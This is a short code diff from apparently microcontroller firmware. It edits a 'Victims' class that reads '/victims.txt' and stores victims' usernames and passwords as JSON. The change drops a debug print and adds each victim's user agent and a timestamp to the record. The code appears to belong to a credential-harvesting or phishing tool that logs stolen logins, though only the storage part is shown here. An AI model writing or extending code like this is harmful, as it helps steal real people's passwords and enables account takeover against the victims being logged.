@@ -14,7 +14,6 @@ public:
     Victims(){
         arquivo = new Arquivomaneger("/victims.txt");
         String victimsFullText = arquivo->readFile();
-        Serial.println(victimsFullText);
         deserializeJson(doc, victimsFullText);
     }
 
@@ -26,6 +25,8 @@ public:
         
         victim["username"] = docTemp["username"];
         victim["password"] = docTemp["password"];
+        victim["useragent"] = docTemp["useragent"];
+        victim["datetime"] = docTemp["datetime"];
 
         String out;
         serializeJson(doc, out);
